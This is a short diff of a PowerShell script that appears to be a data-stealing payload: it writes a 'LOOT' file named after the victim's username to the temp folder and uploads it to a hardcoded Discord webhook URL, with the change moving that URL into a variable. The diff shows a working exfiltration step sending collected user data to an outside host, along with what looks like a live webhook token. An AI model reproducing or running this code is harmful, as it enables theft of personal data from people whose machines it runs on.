@@ -1,5 +1,5 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
-
+$dc= "https://discord.com/api/webhooks/1312765751668641902/hr5aG72Num4byL408C_syhc-Owz8FWMohO-PfITGT4etj77_DLKG32Ac1ruadc12PGnG"
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Get-fullName {
@@ -70,7 +70,7 @@ function Upload-Discord {
         [string]$text
     )
 
-    $hookurl = "https://discord.com/api/webhooks/1312765751668641902/hr5aG72Num4byL408C_syhc-Owz8FWMohO-PfITGT4etj77_DLKG32Ac1ruadc12PGnG"
+    $hookurl = "$dc"  # Discord webhook URL
 
     $Body = @{
         'username' = $env:username
@@ -89,4 +89,3 @@ function Upload-Discord {
 if (-not ([string]::IsNullOrEmpty($dc))) {
     Upload-Discord -file "$FileName"
 }
-
